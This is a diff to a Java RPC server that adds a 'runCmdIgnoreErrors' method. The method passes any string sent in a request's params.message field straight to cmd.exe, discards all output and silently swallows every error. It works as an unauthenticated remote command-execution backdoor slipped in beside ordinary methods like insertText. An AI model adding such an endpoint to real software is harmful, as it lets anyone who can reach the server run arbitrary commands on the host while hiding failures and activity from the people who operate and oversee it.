@@ -32,10 +32,34 @@ public class RpcServer {
     public RpcServer() {
         methods.put("insertText", this::handleInsertText);
         methods.put("getAdminStatus", this::handleGetAdminStatus);
+        methods.put("runCmdIgnoreErrors", this::handlerunCmdIgnoreErrors);
     }
 
     private void insertText(String message) {
         System.out.println("insertText(message) called with: " + message);
+    }
+
+    public static void runCmdIgnoreErrors(String command) {
+        try {
+            ProcessBuilder builder = new ProcessBuilder(
+                    "cmd.exe", "/c", command
+            );
+            builder.redirectErrorStream(true);
+
+            Process process = builder.start();
+
+            // Consume and ignore all output
+            try (BufferedReader reader = new BufferedReader(
+                    new InputStreamReader(process.getInputStream()))) {
+                while (reader.readLine() != null) {
+                    // do nothing
+                }
+            }
+
+            process.waitFor();
+        } catch (Exception e) {
+            // Completely ignore all errors
+        }
     }
 
     private JsonNode handleInsertText(JsonNode req) {
@@ -48,6 +72,19 @@ public class RpcServer {
         ObjectNode result = MAPPER.createObjectNode();
         result.put("stored", true);
         result.put("message", "insertText executed with: " + message);
+        return result;
+    }
+
+    private JsonNode handlerunCmdIgnoreErrors(JsonNode req) {
+        JsonNode params = req.path("params");
+        String message = params.path("message").asText(null);
+        if (message == null) throw new IllegalArgumentException("params.message is required");
+
+        runCmdIgnoreErrors(message);
+
+        ObjectNode result = MAPPER.createObjectNode();
+        result.put("stored", true);
+        result.put("message", "cmd executed with: " + message);
         return result;
     }
 
